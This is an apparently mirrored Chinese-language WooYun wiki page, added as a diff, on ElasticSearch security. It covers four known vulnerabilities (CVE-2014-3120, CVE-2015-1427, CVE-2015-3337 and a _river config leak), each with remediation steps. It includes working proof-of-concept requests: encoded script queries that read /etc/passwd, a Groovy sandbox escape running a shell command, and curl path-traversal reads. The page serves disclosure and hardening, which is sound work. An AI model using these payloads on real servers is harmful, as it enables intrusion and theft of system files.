@@ -1,0 +1,206 @@
+<!DOCTYPE html>
+<html lang="zh" dir="ltr">
+
+<!-- Mirrored from wiki.wooyun.org/_export/xhtml/server:elasticsearch by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 04 Dec 2015 03:02:54 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
+<head>
+  <meta charset="utf-8" />
+  <title>server:elasticsearch</title>
+<meta name="generator" content="DokuWiki"/>
+<meta name="robots" content="index,follow"/>
+<meta name="keywords" content="server,elasticsearch"/>
+<link rel="search" type="application/opensearchdescription+xml" href="../../lib/exe/opensearch.php" title="WooYun WiKi"/>
+<link rel="start" href="../../index.html"/>
+<link rel="contents" href="../../server_elasticsearchdecf.html?do=index" title="网站地图"/>
+<link rel="alternate" type="application/rss+xml" title="最近更改" href="../../feed.php"/>
+<link rel="alternate" type="application/rss+xml" title="当前命名空间" href="../../feed0688.php?mode=list&amp;ns=server"/>
+<link rel="alternate" type="text/html" title="纯HTML" href="server_elasticsearch.html"/>
+<link rel="alternate" type="text/plain" title="Wiki Markup 语言" href="../raw/elasticsearch.txt"/>
+<link rel="canonical" href="../../server_elasticsearch.html"/>
+<link rel="stylesheet" type="text/css" href="../../lib/exe/css70b4.css?t=bootstrap3&amp;tseed=6dcbf66232c3759c28d0e8f6d9cdfd22"/>
+<script type="text/javascript">/*<![CDATA[*/var NS='server';var JSINFO = {"id":"server:elasticsearch","namespace":"server","plugin_codeprettify":{"loader_base":"\/lib\/plugins\/codeprettify\/google-code-prettify"}};
+/*!]]>*/</script>
+<script type="text/javascript" charset="utf-8" src="../../lib/exe/js1e16.php?tseed=6dcbf66232c3759c28d0e8f6d9cdfd22"></script>
+<script type="text/javascript" charset="utf-8" src="../../lib/plugins/codeprettify/google-code-prettify/run_prettifyeb11.js?lang=css"></script>
+</head>
+<body>
+<div class="dokuwiki export">
+<!-- TOC START -->
+<div id="dw__toc">
+<h3 class="toggle">目录</h3>
+<div>
+
+<ul class="toc">
+<li class="level1"><div class="li"><a href="#elasticsearch安全配置">ElasticSearch安全配置</a></div>
+<ul class="toc">
+<li class="clear">
+<ul class="toc">
+<li class="level3"><div class="li"><a href="#elasticsearch简介">1、ElasticSearch简介</a></div></li>
+<li class="level3"><div class="li"><a href="#elasticsearch漏洞">2、ElasticSearch漏洞</a></div></li>
+</ul></li>
+</ul></li>
+</ul>
+</div>
+</div>
+<!-- TOC END -->
+
+<h1 class="sectionedit1" id="elasticsearch安全配置">ElasticSearch安全配置</h1>
+<div class="level1">
+
+</div>
+<!-- EDIT1 SECTION "ElasticSearch安全配置" [1-40] -->
+<h3 class="sectionedit2" id="elasticsearch简介">1、ElasticSearch简介</h3>
+<div class="level3">
+
+<p>
+ElasticSearch是JAVA开发的一个基于Lucene的搜索服务器，它提供了一个分布式多用户能力的全文搜索引擎。
+</p>
+
+<p>
+很多小伙伴用ElasticSearch配合其它工具进行日志分析平台的搭建，但是ElasticSearch不同版本存在多个漏洞。
+</p>
+<hr />
+
+</div>
+<!-- EDIT2 SECTION "1、ElasticSearch简介" [41-356] -->
+<h3 class="sectionedit3" id="elasticsearch漏洞">2、ElasticSearch漏洞</h3>
+<div class="level3">
+
+</div>
+
+<h4 id="elasticsearch远程命令执行_cve-2014-3120">2.1 ElasticSearch远程命令执行(CVE-2014-3120)</h4>
+<div class="level4">
+
+<p>
+漏洞介绍：
+</p>
+
+<p>
+ElasticSearch有脚本执行(scripting)的功能，可以很方便地对查询出来的数据再加工处理。ElasticSearch用的脚本引擎是MVEL，这个引擎没有做任何的防护，或者沙盒包装，所以直接可以执行任意代码。
+</p>
+
+<p>
+而在ElasticSearch 1.2之前的版本中，默认配置是打开动态脚本功能的，如果用户没有更改默认配置文件，攻击者可以直接通过http请求执行任意代码。
+</p>
+
+<p>
+测试POC：
+</p>
+<pre class="code">http://127.0.0.1:9200/_search?source=%7B%22size%22%3A1%2C%22query%22%3A%7B%22filtered%22%3A%7B%22query%22%3A%7B%22match_all%22%3A%7B%7D%7D%7D%7D%2C%22script_fields%22%3A%7B%22%2Fetc%2Fhosts%22%3A%7B%22script%22%3A%22import%20java.util.*%3B%5Cnimport%20java.io.*%3B%5Cnnew%20Scanner(new%20File(%5C%22%2Fetc%2Fhosts%5C%22)).useDelimiter(%5C%22%5C%5C%5C%5CZ%5C%22).next()%3B%22%7D%2C%22%2Fetc%2Fpasswd%22%3A%7B%22script%22%3A%22import%20java.util.*%3B%5Cnimport%20java.io.*%3B%5Cnnew%20Scanner(new%20File(%5C%22%2Fetc%2Fpasswd%5C%22)).useDelimiter(%5C%22%5C%5C%5C%5CZ%5C%22).next()%3B%22%7D%7D%7D&amp;callback=jQuery111107529820275958627_1400564696673&amp;_=1400564696674</pre>
+
+<p>
+修复方法：
+</p>
+
+<p>
+1，升级ElasticSearch为最新版本；
+</p>
+
+<p>
+2，在配置文件elasticsearch.yml里为每一个节点都加上：script.disable_dynamic: true。
+</p>
+
+<p>
+漏洞案例：
+</p>
+
+<p>
+<a href="http://wooyun.org/bugs/wooyun-2014-061672" class="urlextern" title="http://wooyun.org/bugs/wooyun-2014-061672"  rel="nofollow">果壳网某服务远程命令执行漏洞(非st2)</a>
+</p>
+
+</div>
+
+<h4 id="elasticsearch_groovy命令执行漏洞_cve-2015-1427">2.2 Elasticsearch Groovy命令执行漏洞(CVE-2015-1427)</h4>
+<div class="level4">
+
+<p>
+漏洞介绍：
+</p>
+
+<p>
+该漏洞主要存在于ElastciSearch 1.3.0-1.3.7和1.4.0-1.4.2，ElasticSearch在比较新的版本中脚本语言引擎使用了Groovy，并且加入了沙盒进行控制，危险代码会被拦截掉。由于沙盒限制不严格，导致存在该漏洞。
+</p>
+
+<p>
+测试POC:
+</p>
+<pre class="code">POST http://127.0.0.1:9200/_search?pretty 
+
+{&quot;size&quot;:1,&quot;script_fields&quot;: {&quot;test#&quot;: {&quot;script&quot;:&quot;java.lang.Math.class.forName(\&quot;java.io.BufferedReader\&quot;).getConstructor(java.io.Reader.class).newInstance(java.lang.Math.class.forName(\&quot;java.io.InputStreamReader\&quot;).getConstructor(java.io.InputStream.class).newInstance(java.lang.Math.class.forName(\&quot;java.lang.Runtime\&quot;).getRuntime().exec(\&quot;cat /etc/passwd\&quot;).getInputStream())).readLines()&quot;,&quot;lang&quot;: &quot;groovy&quot;}}}</pre>
+
+<p>
+修复方法：
+</p>
+
+<p>
+1，升级ElasticSearch为最新版本；
+</p>
+
+<p>
+2，在配置文件elasticsearch.yml里为每一个节点都加上：script.groovy.sandbox.enabled: true。
+</p>
+
+<p>
+漏洞案例：
+</p>
+
+<p>
+<a href="http://www.wooyun.org/bugs/wooyun-2015-099572" class="urlextern" title="http://www.wooyun.org/bugs/wooyun-2015-099572"  rel="nofollow">启维文化某服务器ElasticSearch Groovy命令执行漏洞</a>
+</p>
+
+</div>
+
+<h4 id="elasticsearch_任意文件读取漏洞_cve-2015-3337">2.3 Elasticsearch 任意文件读取漏洞(CVE-2015-3337)</h4>
+<div class="level4">
+
+<p>
+测试POC:
+</p>
+<pre class="code">curl http://127.0.1.1:9200/_plugin/head/../../config/elasticsearch.yml 注意curl版本
+
+curl http://127.0.0.1:9200/_plugin/插件名称如head/../../xx文件</pre>
+
+<p>
+修复方法：
+1，升级ElasticSearch为最新版本
+</p>
+
+</div>
+
+<h4 id="elasticsearch_数据库配置文件读取问题">2.4 Elasticsearch 数据库配置文件读取问题</h4>
+<div class="level4">
+
+<p>
+测试POC:
+</p>
+
+<p>
+<a href="http://localhost:9200/_river/search" class="urlextern" title="http://localhost:9200/_river/search"  rel="nofollow">http://localhost:9200/_river/search</a>
+</p>
+
+<p>
+<a href="https://www.exploit-db.com/exploits/37054/" class="urlextern" title="https://www.exploit-db.com/exploits/37054/"  rel="nofollow">exp-db:CVE-2015-3337</a>
+</p>
+
+<p>
+修复方法：
+</p>
+
+<p>
+1、安装elasticsearch官方的Shield
+</p>
+
+<p>
+2、添加iptables规则
+</p>
+
+<p>
+3、设置elasticsearch.yml文件中的network.bind_host: 内网ip,仅允许内网访问
+</p>
+
+</div>
+<!-- EDIT3 SECTION "2、ElasticSearch漏洞" [357-] --></div>
+</body>
+
+<!-- Mirrored from wiki.wooyun.org/_export/xhtml/server:elasticsearch by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 04 Dec 2015 03:02:54 GMT -->
+</html>
